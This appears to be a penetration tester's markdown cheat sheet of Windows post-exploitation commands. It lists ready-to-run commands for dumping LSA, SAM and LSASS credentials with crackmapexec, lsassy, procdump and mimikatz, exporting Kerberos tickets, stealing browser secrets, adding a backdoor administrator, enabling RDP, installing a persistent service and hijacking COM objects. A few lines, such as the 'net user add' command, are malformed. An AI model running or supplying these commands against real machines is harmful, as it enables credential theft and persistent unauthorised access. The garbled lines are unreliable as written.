# Post-Ex Windows

## **Dump secrets**

### LSA

```bash
crackmapexec smb perim_up.txt -u '<user>' -d '<domain>' -p '<pass>' --lsa
```

### SAM
```bash
crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --sam

reg save hklm\sam .\sam reg save hklm\system .\system reg save hklm\security .\security 
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL

```
### LSASS 
```bash
crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> -M lsassy

lsassy -d '.' -u 'Administrateur' -H '<hash>' <ip>
lsassy -d <domain> -u <user> -p <pass> <ip>

./spraykatz.py -u <user> -p <password> -t <ip>

pypykatz lsa minidump lsass.dmp

procdump.exe --accepteula -ma lsass c:\WINDOWS\Temp\lsass.txt

.\mimikatz.exe "log" "privilege::debug" "sekurlsa::logonpasswords" exit
```

### Kerberos 

```bash
.\mimikatz.exe "log" "privilege::debug" "kerberos::list /export" exit

```

### Browser secrets

```bash
sharpchrome.exe
```

## create/add new local admin account 

```bash
net user add <user> <pass>
net localgroup "Administrators" <user> /add
```

## Enable RDP

```bash
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
```

add user to RDP group

```bash
net localgroup "Remote Desktop Users" <user> /add
```

## Create service 

```bash
New-Service -BinaryPathName C:\Users\sqlServer\Documents\system2.exe -Name syshell -DisplayName syshell -StartupType Automatic 
Start-Service syshell
```

## COM hijack

```bash
schtasks /query /xml > tasks.xml
reg query "HKCR\CLSID\{<COM_CLSID>}\Inprocserver32"
reg query "HKCU\software\classes\CLSID\{<COM_CLSID>}\Inprocserver32"
reg query "HKLM\software\classes\CLSID\{<COM_CLSID>}\Inprocserver32"
reg export "HKLM\software\classes\CLSID\{<COM_CLSID>}\Inprocserver32" export.reg

# Change to HKCU and change dll
reg import export.reg /reg:64
reg query "HKCR\CLSID\{<COM_CLSID>}\Inprocserver32"
reg query "HKCU\software\classes\CLSID\{<COM_CLSID>}\Inprocserver32"

```
